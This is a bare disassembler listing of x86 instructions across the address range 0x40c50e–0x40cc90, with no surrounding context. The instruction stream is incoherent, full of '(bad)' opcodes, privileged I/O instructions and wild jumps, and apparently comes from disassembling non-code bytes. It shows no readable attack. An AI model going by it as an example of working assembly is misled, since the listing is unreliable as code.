  40c50e:	gs jle 0x40c538
  40c511:	mov    dh,0x7
  40c513:	cmp    BYTE PTR [esi],al
  40c515:	(bad)  
  40c516:	jmp    0x82328085
  40c51b:	mov    dl,0xeb
  40c51d:	jmp    0x40c4b4
  40c51f:	jns    0x40c52c
  40c521:	mov    ah,BYTE PTR [edx+0x66]
  40c524:	inc    ebx
  40c525:	xor    bl,BYTE PTR [ebx]
  40c527:	(bad)  
  40c528:	neg    DWORD PTR [ebx+0x68baf4d6]
  40c52e:	or     eax,0xfa6393d4
  40c533:	shr    BYTE PTR [edi],cl
  40c535:	out    dx,eax
  40c536:	das    
  40c537:	test   eax,0x27999e85
  40c53c:	js     0x40c4f6
  40c53e:	push   0x61
  40c540:	push   es
  40c541:	mov    ds:0xc07bb0f1,al
  40c546:	data16 jb 0x40c55b
  40c549:	ds xor eax,0xfb77565c
  40c54f:	add    bl,0x25
  40c552:	inc    esi
  40c553:	or     eax,0xab9eb676
  40c558:	or     eax,DWORD PTR [esi+esi*2+0x74dcfa5a]
  40c55f:	faddp  st(7),st
  40c561:	pop    edi
  40c562:	adc    esi,DWORD PTR [edi]
  40c564:	mov    DWORD PTR [eax+ebx*8+0x79ecc2d],ebx
  40c56b:	cmp    esi,DWORD PTR [eax+0x39c30e56]
  40c571:	mov    ch,0xa6
  40c573:	inc    edx
  40c574:	stos   BYTE PTR es:[edi],al
  40c575:	push   es
  40c576:	vsqrtss xmm0,xmm1,xmm5
  40c57a:	outs   dx,BYTE PTR ds:[esi]
  40c57b:	scas   eax,DWORD PTR es:[edi]
  40c57c:	cwde   
  40c57d:	xor    bh,BYTE PTR [eax+0x2c1196ef]
  40c583:	shl    edi,0x4d
  40c586:	enter  0xfeb7,0x42
  40c58a:	cld    
  40c58b:	es lock jp 0x40c547
  40c58f:	cmovge edx,DWORD PTR [edi]
  40c592:	lods   al,BYTE PTR ds:[esi]
  40c593:	call   0x33c3fb41
  40c598:	(bad)  
  40c599:	lods   eax,DWORD PTR ds:[esi]
  40c59a:	xor    BYTE PTR [ebx+0x22],bh
  40c59d:	push   ebx
  40c59e:	retf   0x97c2
  40c5a1:	and    eax,0x81925eb8
  40c5a6:	imul   eax,edi,0xffffff95
  40c5a9:	mov    eax,0x8ae0c0de
  40c5ae:	dec    edx
  40c5af:	popa   
  40c5b0:	ror    dh,1
  40c5b2:	mov    al,ds:0x216cd1b1
  40c5b7:	jns    0x40c53d
  40c5b9:	adc    al,0x54
  40c5bb:	stos   DWORD PTR es:[edi],eax
  40c5bc:	hlt    
  40c5bd:	ror    esp,cl
  40c5bf:	cmp    al,0x43
  40c5c1:	popa   
  40c5c2:	and    BYTE PTR [eax],dl
  40c5c4:	imul   esi,DWORD PTR [ecx-0x2],0x15
  40c5c8:	xchg   ebx,eax
  40c5c9:	pop    edx
  40c5ca:	and    eax,0x9315d4c2
  40c5cf:	ins    DWORD PTR es:[edi],dx
  40c5d0:	out    0x91,al
  40c5d2:	imul   esi,DWORD PTR [ecx-0xcd941fb],0xffffffb8
  40c5d9:	in     al,dx
  40c5da:	neg    BYTE PTR [ecx]
  40c5dc:	xchg   ebx,eax
  40c5dd:	cmp    ch,bl
  40c5df:	jmp    DWORD PTR [ecx+esi*4+0x4a]
  40c5e3:	nop
  40c5e4:	clc    
  40c5e5:	fdiv   st(0),st
  40c5e7:	std    
  40c5e8:	addr16 mov esp,0x338f5cb3
  40c5ee:	add    DWORD PTR [ebp-0x9],0xfffffffe
  40c5f2:	jno    0x40c61d
  40c5f4:	loop   0x40c5ee
  40c5f6:	mov    dl,dl
  40c5f8:	jno    0x40c5af
  40c5fa:	stc    
  40c5fb:	mov    dh,0xc9
  40c5fd:	push   es
  40c5fe:	jne    0x40c630
  40c600:	and    DWORD PTR [edx-0x11933ee8],edx
  40c606:	bound  esp,QWORD PTR [edi-0x2060280a]
  40c60c:	shr    DWORD PTR [eax-0x61d2933b],cl
  40c612:	mov    eax,DWORD PTR [edx]
  40c614:	cli    
  40c615:	adc    BYTE PTR [ebp-0x59],cl
  40c618:	jmp    0x4a23:0x6a058151
  40c61f:	and    DWORD PTR [eax+0x33],esp
  40c622:	ds shl dh,1
  40c625:	sahf   
  40c626:	out    0x23,eax
  40c628:	add    al,0x35
  40c62a:	pop    edx
  40c62b:	dec    edi
  40c62c:	sti    
  40c62d:	push   0x992b780
  40c632:	jb     0x40c5d0
  40c634:	iret   
  40c635:	add    al,0xd4
  40c637:	dec    edi
  40c638:	(bad)  
  40c639:	mov    ds:0x623ce3f1,al
  40c63e:	or     eax,0xefaac184
  40c643:	outs   dx,DWORD PTR ds:[esi]
  40c644:	neg    BYTE PTR [esi+0x1677079d]
  40c64a:	jno    0x40c612
  40c64c:	arpl   WORD PTR [edi-0x14ef12d4],cx
  40c652:	leave  
  40c653:	fstp   TBYTE PTR [edi+0x4c]
  40c656:	rcl    BYTE PTR [edx+0x50abdfb7],1
  40c65c:	xor    bh,BYTE PTR [edx]
  40c65e:	push   esi
  40c65f:	jle    0x40c6b3
  40c661:	lds    esp,FWORD PTR [ebp+0x1321eb48]
  40c667:	fidiv  WORD PTR [edx+0x7b]
  40c66a:	pop    esi
  40c66b:	repz mov cl,0xab
  40c66f:	fldcw  WORD PTR [eax-0x2e928cf0]
  40c675:	fst    QWORD PTR [ecx+0x7f42f11a]
  40c67b:	mov    cl,0x59
  40c67d:	bnd jge 0x40c67a
  40c680:	jmp    0x40c680
  40c682:	fst    DWORD PTR [eax]
  40c684:	push   eax
  40c685:	dec    edx
  40c686:	clc    
  40c687:	test   BYTE PTR [esi],0x93
  40c68a:	lods   al,BYTE PTR ds:[esi]
  40c68b:	out    0xb8,al
  40c68d:	mov    eax,esp
  40c68f:	inc    edi
  40c690:	or     edx,DWORD PTR [esi-0x6be00587]
  40c696:	cmp    ch,BYTE PTR [ecx]
  40c698:	scas   eax,DWORD PTR es:[di]
  40c69a:	mov    dl,0xb
  40c69c:	xchg   ebp,eax
  40c69d:	outs   dx,BYTE PTR ds:[esi]
  40c69e:	shl    DWORD PTR [ecx+0x7c],cl
  40c6a1:	push   ds
  40c6a2:	adc    ecx,ecx
  40c6a4:	pop    ecx
  40c6a5:	push   esi
  40c6a6:	inc    esp
  40c6a7:	and    eax,0x1a5be420
  40c6ac:	or     edx,esi
  40c6ae:	ds xchg esi,eax
  40c6b0:	mov    esi,0xd82fee62
  40c6b5:	test   BYTE PTR [edx],al
  40c6b7:	push   ss
  40c6b8:	mov    ds:0xff0cd9b8,eax
  40c6bd:	and    BYTE PTR [edi-0x616cb966],ch
  40c6c3:	adc    al,0x94
  40c6c5:	adc    edx,ebx
  40c6c7:	push   esp
  40c6c8:	pop    edi
  40c6c9:	mov    ss,esi
  40c6cb:	sub    esi,DWORD PTR [eax+0x40dbf41]
  40c6d1:	test   edx,0xcc1fb971
  40c6d7:	mov    ebp,0xf1857f5f
  40c6dc:	pop    ebx
  40c6dd:	inc    ebp
  40c6de:	mov    ebx,0x10517333
  40c6e3:	mov    ecx,0x14c79870
  40c6e8:	pusha  
  40c6e9:	jmp    0xb21f:0x80258151
  40c6f0:	pop    ebx
  40c6f1:	fld    DWORD PTR ds:0xb3d276fc
  40c6f7:	push   edx
  40c6f8:	fcmovnb st,st(7)
  40c6fa:	xor    dh,BYTE PTR [eax-0x4f86c388]
  40c700:	call   0x66a48ab9
  40c705:	cdq    
  40c706:	add    eax,0x23652ede
  40c70b:	out    0x49,eax
  40c70d:	pop    ebp
  40c70e:	adc    ebx,DWORD PTR ds:0xbf6e1e4b
  40c714:	add    BYTE PTR [ebx],bh
  40c716:	popf   
  40c717:	test   bh,bh
  40c719:	scas   eax,DWORD PTR es:[edi]
  40c71a:	lods   eax,DWORD PTR ds:[esi]
  40c71b:	cmc    
  40c71c:	jb     0x40c6c7
  40c71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c71f:	lods   eax,DWORD PTR ds:[esi]
  40c720:	pop    esp
  40c721:	inc    BYTE PTR [edx-0x15cd4543]
  40c727:	cvtps2pd xmm7,QWORD PTR [ecx-0x54]
  40c72b:	cmp    bl,BYTE PTR [edx]
  40c72d:	mov    eax,esi
  40c72f:	mov    cl,0xeb
  40c731:	pushw  ss
  40c733:	rcl    BYTE PTR ds:0x9ad52985,cl
  40c739:	mov    dl,0x5
  40c73b:	mov    ebp,DWORD PTR [esi+esi*8]
  40c73e:	pop    eax
  40c73f:	jmp    0x40c75f
  40c741:	hlt    
  40c742:	dec    esi
  40c743:	add    al,0xe8
  40c745:	adc    bl,dh
  40c747:	hlt    
  40c748:	push   eax
  40c749:	pop    ss
  40c74a:	es fdivrp st(2),st
  40c74d:	dec    esp
  40c74e:	push   cs
  40c74f:	mov    esp,0x78ccdd71
  40c754:	mov    BYTE PTR [edx-0x1d],0xf6
  40c758:	in     eax,0x62
  40c75a:	nop
  40c75b:	ja     0x40c751
  40c75d:	sub    eax,0xca868c3
  40c762:	jns    0x40c70a
  40c764:	or     BYTE PTR [esp+ebp*4-0x18],0xfd
  40c769:	call   DWORD PTR [ebp+0x6f69d9a9]
  40c76f:	jge    0x40c73e
  40c771:	jmp    0x40c78c
  40c773:	sub    BYTE PTR [edi],bl
  40c775:	in     al,0x4d
  40c777:	das    
  40c778:	popa   
  40c779:	jo     0x40c7b6
  40c77b:	sub    dh,cl
  40c77d:	jns    0x40c73a
  40c77f:	jae    0x40c750
  40c781:	cmp    eax,0xf94d90f6
  40c786:	jbe    0x40c7fc
  40c788:	adc    BYTE PTR [ebx-0x3d74da6a],0xe5
  40c78f:	adc    BYTE PTR [ebp+0x38c91],bl
  40c795:	jl     0x40c792
  40c797:	sbb    bl,bh
  40c799:	stos   DWORD PTR es:[edi],eax
  40c79a:	mov    bl,0x67
  40c79c:	stos   DWORD PTR es:[edi],eax
  40c79d:	cmp    eax,0xa7419ff6
  40c7a2:	js     0x40c75b
  40c7a4:	jp     0x40c747
  40c7a6:	adc    BYTE PTR [esi+0x47],0xc9
  40c7aa:	sub    bh,bh
  40c7ac:	jl     0x40c7e7
  40c7ae:	mov    ch,0x3c
  40c7b0:	loope  0x40c772
  40c7b2:	xchg   ebp,eax
  40c7b3:	arpl   bp,bp
  40c7b5:	sbb    eax,ebx
  40c7b7:	sbb    edx,eax
  40c7b9:	or     dh,BYTE PTR [eax+ebx*4-0x2e]
  40c7bd:	add    BYTE PTR [ebp+0x52f1ad66],dh
  40c7c3:	pop    es
  40c7c4:	cld    
  40c7c5:	ret    0xcd5c
  40c7c8:	mov    BYTE PTR [esi],bh
  40c7ca:	(bad)  
  40c7cb:	rol    DWORD PTR es:[edi-0x3a5b481c],cl
  40c7d2:	xlat   BYTE PTR ds:[ebx]
  40c7d3:	jnp    0x40c7ad
  40c7d5:	test   BYTE PTR [ebx+0x30],dh
  40c7d8:	repz jp 0x40c826
  40c7db:	or     esp,DWORD PTR [ecx+0x138a8297]
  40c7e1:	in     al,0xe4
  40c7e3:	adc    edi,ecx
  40c7e5:	mov    dl,0x58
  40c7e7:	fisttp WORD PTR [esi-0x4a]
  40c7ea:	dec    edi
  40c7eb:	(bad)  
  40c7ec:	dec    ebx
  40c7ed:	jmp    0x5577f9c6
  40c7f2:	jecxz  0x40c851
  40c7f4:	es ins DWORD PTR es:[edi],dx
  40c7f6:	mov    al,ds:0x52c9353d
  40c7fb:	mov    bh,0x5e
  40c7fd:	and    DWORD PTR [edi],esp
  40c7ff:	push   edx
  40c800:	stc    
  40c801:	mov    DWORD PTR [eax+eax*8-0x73713f54],ecx
  40c808:	stos   DWORD PTR es:[edi],eax
  40c809:	clc    
  40c80a:	mov    es,WORD PTR [edi-0x2af2015d]
  40c810:	adc    eax,DWORD PTR [edx-0x67f447ed]
  40c816:	into   
  40c817:	lock das 
  40c819:	fs dec ecx
  40c81b:	ret    0x1c62
  40c81e:	hlt    
  40c81f:	outs   dx,BYTE PTR ds:[esi]
  40c820:	and    eax,0xa068d4d6
  40c825:	idiv   ebx
  40c827:	rcl    al,cl
  40c829:	or     eax,edx
  40c82b:	or     ch,cl
  40c82d:	jbe    0x40c7e0
  40c82f:	out    0x5b,eax
  40c831:	jecxz  0x40c8b1
  40c833:	(bad)  
  40c834:	pop    ds
  40c835:	mov    dl,0x1
  40c837:	dec    eax
  40c838:	test   DWORD PTR [ebx],edi
  40c83a:	leave  
  40c83b:	hlt    
  40c83c:	sti    
  40c83d:	adc    esi,DWORD PTR [ebx+0x614b00ea]
  40c843:	add    esi,DWORD PTR [esi]
  40c845:	mov    ebp,0x3528c978
  40c84a:	pushf  
  40c84b:	std    
  40c84c:	retf   
  40c84d:	hlt    
  40c84e:	sbb    al,0x2b
  40c850:	pop    es
  40c851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c852:	inc    edi
  40c853:	jl     0x40c7d6
  40c855:	mov    esp,0x1d46288
  40c85a:	ror    DWORD PTR ds:0x65bbc9c3,0x31
  40c861:	and    DWORD PTR [ebx-0x66],esp
  40c864:	aas    
  40c865:	int3   
  40c866:	dec    edi
  40c867:	lahf   
  40c868:	dec    edi
  40c869:	shr    DWORD PTR [esi-0x70285ece],1
  40c86f:	mov    ds,WORD PTR [edi+0x1b01ea0e]
  40c875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c876:	cmp    al,0x49
  40c878:	stos   BYTE PTR es:[edi],al
  40c879:	xlat   BYTE PTR ds:[ebx]
  40c87a:	fwait
  40c87b:	es cmp al,0xed
  40c87e:	xor    ebx,DWORD PTR [edx]
  40c880:	cmp    DWORD PTR [edi-0x1f],edi
  40c883:	xlat   BYTE PTR ds:[ebx]
  40c884:	mov    bh,0x45
  40c886:	popa   
  40c887:	mov    eax,0x43b34b67
  40c88c:	dec    esi
  40c88d:	vunpckhps ymm3,ymm5,YMMWORD PTR [edi-0x6e11c06b]
  40c895:	lods   eax,DWORD PTR ds:[esi]
  40c896:	call   0xa922f0e
  40c89b:	mul    edx
  40c89d:	leave  
  40c89e:	mov    ebp,edx
  40c8a0:	cwde   
  40c8a1:	pop    ss
  40c8a2:	push   ds
  40c8a3:	sub    al,0x83
  40c8a5:	mov    al,ch
  40c8a7:	mov    bl,0xd4
  40c8a9:	jo     0x40c8b9
  40c8ab:	cmc    
  40c8ac:	xor    al,0xf6
  40c8ae:	push   es
  40c8af:	pop    edi
  40c8b0:	push   eax
  40c8b1:	sub    DWORD PTR [edi-0xc],esi
  40c8b4:	imul   esp,esi,0x6544f121
  40c8ba:	jne    0x40c8d5
  40c8bc:	pop    ebx
  40c8bd:	outs   dx,DWORD PTR ds:[esi]
  40c8be:	sub    DWORD PTR [eax],0x92cfeb96
  40c8c4:	adc    al,0x67
  40c8c6:	pop    ds
  40c8c7:	mov    dl,0x8f
  40c8c9:	sub    al,0x8e
  40c8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8cc:	mov    dl,0x10
  40c8ce:	(bad)  
  40c8cf:	int3   
  40c8d0:	cmc    
  40c8d1:	jae    0x40c8ec
  40c8d3:	pop    edx
  40c8d4:	mov    bl,0x3c
  40c8d6:	or     al,0x16
  40c8d8:	punpcklbw mm7,DWORD PTR [esp+esi*8+0x15]
  40c8dd:	add    BYTE PTR [eax-0x50e6d1f3],ch
  40c8e3:	cld    
  40c8e4:	ret    0x66d3
  40c8e7:	xchg   DWORD PTR [ebx-0x14726a99],edx
  40c8ed:	hlt    
  40c8ee:	xchg   edx,eax
  40c8ef:	xor    bl,BYTE PTR [ebx]
  40c8f1:	inc    ebx
  40c8f2:	sahf   
  40c8f3:	ds mov edx,0x3c7400c1
  40c8f9:	adc    DWORD PTR [eax],ebx
  40c8fb:	fs stc 
  40c8fd:	addr16 push eax
  40c8ff:	faddp  st(5),st
  40c901:	fs mov ch,0x3
  40c904:	pop    esp
  40c905:	pop    esi
  40c906:	pop    ecx
  40c907:	sti    
  40c908:	jle    0x40c962
  40c90a:	inc    edi
  40c90b:	mov    BYTE PTR [ebp+0x6632bd43],0x9f
  40c912:	jb     0x40c8b1
  40c914:	xchg   ecx,eax
  40c915:	pop    ebp
  40c916:	inc    eax
  40c917:	push   edx
  40c918:	cmp    ecx,ebp
  40c91a:	sbb    DWORD PTR [edx],0xdf19e69
  40c920:	out    0x7f,eax
  40c922:	(bad)  
  40c923:	pop    ss
  40c924:	jne    0x40c94c
  40c926:	mov    al,0x40
  40c928:	jle    0x40c8f2
  40c92a:	(bad)  
  40c92b:	fimul  DWORD PTR [edi-0x7338ee2b]
  40c931:	jge    0x40c937
  40c933:	repnz and esp,esi
  40c936:	xor    edx,esp
  40c938:	out    0x71,eax
  40c93a:	adc    BYTE PTR [esi],0x5f
  40c93d:	sbb    DWORD PTR [edx],esi
  40c93f:	ret    0x1ccf
  40c942:	mov    bh,ah
  40c944:	ror    DWORD PTR [esi-0x8c8337],cl
  40c94a:	and    al,0x16
  40c94c:	mov    ss,WORD PTR [ecx]
  40c94e:	ins    BYTE PTR es:[edi],dx
  40c94f:	in     al,dx
  40c950:	push   0xfad09919
  40c955:	xchg   ebx,eax
  40c956:	pop    ds
  40c957:	shl    esi,1
  40c959:	out    0x39,al
  40c95b:	push   edx
  40c95c:	mov    dh,0xf5
  40c95e:	fsub   DWORD PTR [esi-0x2a]
  40c961:	ret    0x7e40
  40c964:	dec    ebp
  40c965:	ss push ebp
  40c967:	mov    eax,ds:0x83766b1c
  40c96c:	or     dl,BYTE PTR [ecx+ebx*8+0x55d049a3]
  40c973:	or     al,0x74
  40c975:	pusha  
  40c976:	cmp    BYTE PTR [edx-0x64],cl
  40c979:	cld    
  40c97a:	mov    ah,0xf4
  40c97c:	daa    
  40c97d:	or     ebx,DWORD PTR [ecx]
  40c97f:	sbb    cl,ch
  40c981:	add    al,0xae
  40c983:	lock push eax
  40c985:	jae    0x40c985
  40c987:	adc    edi,ecx
  40c989:	fist   DWORD PTR [ebx+0x0]
  40c98c:	(bad)  
  40c98d:	iret   
  40c98e:	and    BYTE PTR [ebp+0x5c61f2d9],al
  40c994:	jae    0x40c9ee
  40c996:	and    al,0x9c
  40c998:	popa   
  40c999:	jae    0x40c9a8
  40c99b:	les    edi,FWORD PTR [edx-0x30a8c44b]
  40c9a1:	push   es
  40c9a2:	and    bl,BYTE PTR [eax-0x58]
  40c9a5:	gs and al,0x59
  40c9a8:	jge    0x40c9fe
  40c9aa:	dec    esi
  40c9ab:	imul   edx,DWORD PTR [ebx],0xcddfbe06
  40c9b1:	add    ecx,esi
  40c9b3:	adc    DWORD PTR [esi+0x6616bb23],ebp
  40c9b9:	repnz mov cl,0xc7
  40c9bc:	jl     0x40ca0e
  40c9be:	sub    al,0xad
  40c9c0:	adc    eax,0x1ead533
  40c9c5:	add    eax,0x1f8bad78
  40c9ca:	cwde   
  40c9cb:	lods   al,BYTE PTR ds:[esi]
  40c9cc:	fs fwait
  40c9ce:	jge    0x40c980
  40c9d0:	xor    al,0xf
  40c9d2:	mov    bh,0xd7
  40c9d4:	lods   al,BYTE PTR ds:[esi]
  40c9d5:	popa   
  40c9d6:	push   0xffffffb2
  40c9d8:	test   DWORD PTR [ebp-0x71],eax
  40c9db:	push   es
  40c9dc:	outs   dx,BYTE PTR ds:[esi]
  40c9dd:	scas   eax,DWORD PTR es:[edi]
  40c9de:	inc    eax
  40c9df:	jmp    0xff5d80b4
  40c9e4:	in     al,dx
  40c9e5:	adc    al,0xa7
  40c9e7:	sar    edi,1
  40c9e9:	jmp    0x40c9a1
  40c9eb:	jle    0x40c978
  40c9ed:	xchg   ebp,ecx
  40c9ef:	jnp    0x40c9e2
  40c9f1:	repz mov edx,0xdae82a84
  40c9f7:	js     0x40c9c8
  40c9f9:	(bad)  
  40c9fa:	mov    esi,0x985b7f3a
  40c9ff:	pusha  
  40ca00:	(bad)  
  40ca02:	test   eax,0x5af6c8aa
  40ca07:	jnp    0x40c9c5
  40ca09:	fdivp  st(1),st
  40ca0b:	jmp    0xa527:0x4204c158
  40ca12:	(bad)  
  40ca13:	popf   
  40ca14:	mov    ds,edi
  40ca16:	mov    bh,0xe
  40ca18:	je     0x40ca5e
  40ca1a:	jno    0x40c9ac
  40ca1c:	pop    ebx
  40ca1d:	into   
  40ca1e:	inc    eax
  40ca1f:	shl    eax,0x6e
  40ca22:	mov    ecx,0x7ca757f9
  40ca27:	push   ebx
  40ca28:	jns    0x40ca51
  40ca2a:	jg     0x40c9e2
  40ca2c:	cmp    WORD PTR [esi+0x54],0xffe8
  40ca31:	(bad)  
  40ca33:	add    DWORD PTR [ecx],edi
  40ca35:	data16 mov BYTE PTR [ebx+eiz*1],al
  40ca39:	pop    ebx
  40ca3a:	add    eax,0x191b8f1e
  40ca3f:	mov    edx,DWORD PTR [edi]
  40ca41:	mov    cl,0x86
  40ca43:	xor    DWORD PTR ds:0x6281dbcf,esp
  40ca49:	push   edi
  40ca4a:	push   es
  40ca4b:	inc    eax
  40ca4c:	mov    edx,0xc66b564f
  40ca51:	enter  0x3c17,0x41
  40ca55:	(bad)  [edx+0x1a19018a]
  40ca5b:	in     al,0x82
  40ca5d:	popf   
  40ca5e:	pop    ds
  40ca5f:	mov    bh,0x77
  40ca61:	out    dx,eax
  40ca62:	mov    edi,0x3c79ab12
  40ca67:	xchg   ebx,eax
  40ca68:	rcr    cl,0x8d
  40ca6b:	sbb    ch,BYTE PTR [ebx]
  40ca6d:	pop    ebp
  40ca6e:	cmp    DWORD PTR [ebx-0x755ad34b],ebx
  40ca74:	ds hlt 
  40ca76:	vpmulhw xmm0,xmm0,XMMWORD PTR ds:0xa7cee150
  40ca7e:	mov    ebp,0x13ded9a5
  40ca83:	xchg   esp,eax
  40ca84:	nop
  40ca85:	jbe    0x40cacb
  40ca87:	pop    esp
  40ca88:	push   es
  40ca89:	mov    ch,0xf6
  40ca8b:	or     bl,BYTE PTR [esi]
  40ca8d:	loop   0x40ca72
  40ca8f:	pusha  
  40ca90:	sahf   
  40ca91:	sub    eax,0x28d39a4
  40ca96:	adc    BYTE PTR [esi-0x4aac91ef],bh
  40ca9c:	or     DWORD PTR [esi+0x1a],eax
  40ca9f:	mov    eax,ds:0xcad38b4d
  40caa4:	mov    bh,0xfb
  40caa6:	adc    al,0x4d
  40caa8:	bound  esi,QWORD PTR [eax+0x5abb558f]
  40caae:	jb     0x40caaf
  40cab0:	hlt    
  40cab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cab2:	mov    dh,dl
  40cab4:	arpl   WORD PTR [ebx-0x33],si
  40cab7:	icebp  
  40cab8:	js     0x40cb25
  40caba:	xor    eax,0x531f1c26
  40cabf:	cmp    al,0x84
  40cac1:	pop    ebx
  40cac2:	fmul   DWORD PTR [ecx+0x3]
  40cac5:	sbb    ebx,DWORD PTR [ecx+0x1311d54e]
  40cacb:	cli    
  40cacc:	or     al,0xfb
  40cace:	sbb    ebx,esi
  40cad0:	mov    ebx,0xb42790ba
  40cad5:	dec    esi
  40cad6:	repz imul ebp,DWORD PTR [eax-0x4871c88d],0x58155734
  40cae1:	mov    esp,0xf95601a5
  40cae6:	push   es
  40cae7:	add    eax,DWORD PTR [esi+0x4e412f2e]
  40caed:	inc    ebp
  40caee:	pop    edx
  40caef:	stc    
  40caf0:	out    0x5d,al
  40caf2:	imul   ecx,DWORD PTR [esi+0x3d],0x789e90ff
  40caf9:	es sbb eax,0x9e41557d
  40caff:	xor    dh,BYTE PTR [edi+0x78]
  40cb02:	pop    ds
  40cb03:	or     BYTE PTR [edx-0x6110b7cd],ah
  40cb09:	pusha  
  40cb0a:	icebp  
  40cb0b:	(bad)  
  40cb0c:	aad    0xc4
  40cb0e:	mov    dh,0x4c
  40cb10:	xlat   BYTE PTR ds:[ebx]
  40cb11:	fs adc al,0x5a
  40cb14:	xchg   bl,ch
  40cb16:	lock cdq 
  40cb18:	int3   
  40cb19:	mov    ebp,edi
  40cb1b:	push   ebx
  40cb1c:	js     0x40cabc
  40cb1e:	sub    eax,0x74905ed8
  40cb23:	lahf   
  40cb24:	jmp    0x40cb43
  40cb26:	out    0x40,al
  40cb28:	imul   ecx,DWORD PTR [ecx+0x9],0x933f20a
  40cb2f:	clc    
  40cb30:	fwait
  40cb31:	ja     0x40cb80
  40cb33:	retf   0x8855
  40cb36:	stos   DWORD PTR es:[edi],eax
  40cb37:	mov    ebx,0xcd20bccf
  40cb3c:	xchg   edx,eax
  40cb3d:	inc    ebp
  40cb3e:	pusha  
  40cb3f:	jle    0x40cafc
  40cb41:	push   edi
  40cb42:	pop    ecx
  40cb44:	aas    
  40cb45:	sbb    BYTE PTR [esi],0x7e
  40cb48:	or     al,0xfb
  40cb4a:	push   0x3f4226f6
  40cb4f:	loopne 0x40cafa
  40cb51:	(bad)  
  40cb52:	push   eax
  40cb53:	pushf  
  40cb54:	cmp    edx,DWORD PTR [edi-0x41]
  40cb57:	out    0x29,al
  40cb59:	jns    0x40cb3c
  40cb5b:	xchg   ebp,eax
  40cb5c:	fmul   DWORD PTR [eax+0x6c98693a]
  40cb62:	sbb    al,0x5c
  40cb64:	inc    ebx
  40cb65:	dec    DWORD PTR [edi+0x502f21bb]
  40cb6b:	lods   al,BYTE PTR gs:[esi]
  40cb6d:	xor    ch,BYTE PTR [eax+0x3b41bb7d]
  40cb73:	jle    0x40cb37
  40cb75:	mov    edi,0x2e8f75d3
  40cb7a:	sbb    al,0xe8
  40cb7c:	mov    DWORD PTR [ebx+ebp*4+0x48],esi
  40cb80:	gs inc edi
  40cb82:	imul   DWORD PTR [edx-0x57e1c57]
  40cb88:	enter  0xf2fa,0x9d
  40cb8c:	mov    dh,BYTE PTR [ebp-0x6e]
  40cb8f:	inc    ebp
  40cb90:	adc    eax,0x57
  40cb93:	out    0x23,eax
  40cb95:	mov    dl,al
  40cb97:	lods   al,BYTE PTR ds:[esi]
  40cb98:	push   esp
  40cb99:	pop    esi
  40cb9a:	mov    eax,0xcc69983b
  40cb9f:	push   edx
  40cba0:	jmp    0xffb47bfc
  40cba5:	out    0x83,al
  40cba7:	mov    dl,0xd6
  40cba9:	push   ds
  40cbaa:	xor    edx,0xb27e91e5
  40cbb0:	call   0x755a:0x489683a
  40cbb7:	aad    0x91
  40cbb9:	pop    ebx
  40cbba:	cmp    bl,ch
  40cbbc:	mov    dl,0xfb
  40cbbe:	aas    
  40cbbf:	aad    0xea
  40cbc1:	mov    edx,0x4b104539
  40cbc6:	cmp    esi,edx
  40cbc8:	inc    esi
  40cbc9:	test   eax,0x37e2a435
  40cbcf:	js     0x40cc1e
  40cbd1:	dec    esp
  40cbd2:	out    0xfe,eax
  40cbd4:	mov    ecx,0xe0658762
  40cbd9:	into   
  40cbda:	mov    gs,edx
  40cbdc:	jns    0x40cbe4
  40cbde:	or     al,ah
  40cbe0:	push   edi
  40cbe1:	mov    dh,0x61
  40cbe3:	lock and DWORD PTR [esi-0x389fdc11],0x84272ed
  40cbee:	cmp    ebx,esi
  40cbf0:	stos   DWORD PTR es:[edi],eax
  40cbf1:	sbb    eax,0xb5a0c780
  40cbf6:	jg     0x40cc39
  40cbf8:	ins    DWORD PTR es:[edi],dx
  40cbf9:	test   BYTE PTR [edi+ebx*1+0x65073753],0xda
  40cc01:	or     esi,edx
  40cc03:	or     DWORD PTR [ebp+ecx*8-0x46],ecx
  40cc07:	push   ss
  40cc08:	out    0x57,al
  40cc0a:	push   ecx
  40cc0b:	mov    ebx,0x7e3bf243
  40cc10:	call   0x1b:0xa96f42e9
  40cc17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc18:	test   eax,0xac498ae4
  40cc1d:	(bad)  
  40cc1e:	cmp    eax,0x6412fe76
  40cc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc24:	jo     0x40cc8d
  40cc26:	sti    
  40cc27:	std    
  40cc28:	nop
  40cc29:	loope  0x40cbae
  40cc2b:	ja     0x40cc5c
  40cc2d:	aad    0xdb
  40cc2f:	mov    edi,0xe1e4ae45
  40cc34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc35:	stc    
  40cc36:	sti    
  40cc37:	xchg   ecx,eax
  40cc38:	jo     0x40cbcb
  40cc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3b:	dec    cl
  40cc3d:	and    eax,0x7e027a90
  40cc42:	or     DWORD PTR [ebx+0x2d37e0a7],eax
  40cc48:	cdq    
  40cc49:	adc    al,0x9
  40cc4b:	jmp    0xca3b8523
  40cc50:	jmp    0x7b27d351
  40cc55:	pop    ss
  40cc56:	stos   BYTE PTR es:[edi],al
  40cc57:	mov    ds:0x8759dda1,al
  40cc5c:	dec    ebp
  40cc5d:	outs   dx,DWORD PTR ds:[esi]
  40cc5e:	pop    es
  40cc5f:	outs   dx,BYTE PTR ds:[esi]
  40cc60:	push   ebx
  40cc61:	pop    eax
  40cc62:	ret    0x2c13
  40cc65:	dec    eax
  40cc66:	inc    edx
  40cc67:	outs   dx,DWORD PTR ds:[esi]
  40cc68:	inc    ecx
  40cc69:	ret    0x8ddf
  40cc6c:	xchg   edx,eax
  40cc6d:	cli    
  40cc6e:	cwde   
  40cc6f:	test   DWORD PTR [ebp+0x23],eax
  40cc72:	or     BYTE PTR [ebx+0x5],bl
  40cc75:	stc    
  40cc76:	mov    ebx,cs
  40cc78:	(bad)  
  40cc79:	iret   
  40cc7a:	(bad)
  40cc7e:	push   ds
  40cc7f:	inc    ecx
  40cc80:	inc    edx
  40cc81:	add    eax,ebp
  40cc83:	imul   esp,DWORD PTR [edx-0x36c58f4a],0xffffffa8
  40cc8a:	in     al,0x9b
  40cc8c:	stos   DWORD PTR es:[edi],eax
  40cc8d:	xchg   ebp,eax
  40cc8e:	inc    ebp
  40cc8f:	std    
  40cc90:	mov    ecx,ecx
